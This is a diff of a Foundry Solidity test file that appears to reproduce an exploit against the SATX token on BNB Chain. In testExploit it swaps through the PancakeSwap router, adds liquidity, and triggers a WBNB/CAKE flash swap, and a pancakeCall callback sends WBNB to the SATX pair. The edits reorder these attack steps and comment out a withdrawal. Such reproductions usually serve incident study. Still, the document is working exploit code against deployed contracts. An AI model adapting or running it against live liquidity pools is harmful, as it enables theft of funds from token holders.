@@ -38,14 +38,14 @@ contract ContractTest is Test {
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(SATX);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        router.swapExactTokensForTokens(
             1000000000000000,
             0,
             path,
             attacker,
             type(uint256).max
         );
-        console2.log("-- SATX-- ", SATX.balanceOf(address(this)));
+        console2.log("-- SATX-- ", SATX.balanceOf(attacker));
         router.addLiquidity(
             address(WBNB),
             address(SATX),
@@ -56,16 +56,20 @@ contract ContractTest is Test {
             attacker,
             type(uint256).max
         );
-        pair_WBNB_CAKE.swap(0, 60000000000000000000, attacker, bytes("1"));
         console2.log(
             "--- ~ testExploit ~ attacker 1 :",
             WBNB.balanceOf(attacker)
         );
-        WBNB.withdraw(WBNB.balanceOf(attacker));
+        pair_WBNB_CAKE.swap(0, 60000000000000000000, attacker, bytes("0x"));
         console2.log(
-            "--- ~ testExploit ~ attacker 2:",
+            "--- ~ testExploit ~ attacker 2 :",
             WBNB.balanceOf(attacker)
         );
+        // WBNB.withdraw(WBNB.balanceOf(attacker));
+        // console2.log(
+        //     "--- ~ testExploit ~ attacker 3:",
+        //     WBNB.balanceOf(attacker)
+        // );
     }
 
     function pancakeCall(
@@ -113,5 +117,6 @@ contract ContractTest is Test {
             WBNB.transfer(address(pair_WBNB_SATX), 52000000000000000000);
         }
     }
+
     fallback() external payable {}
 }
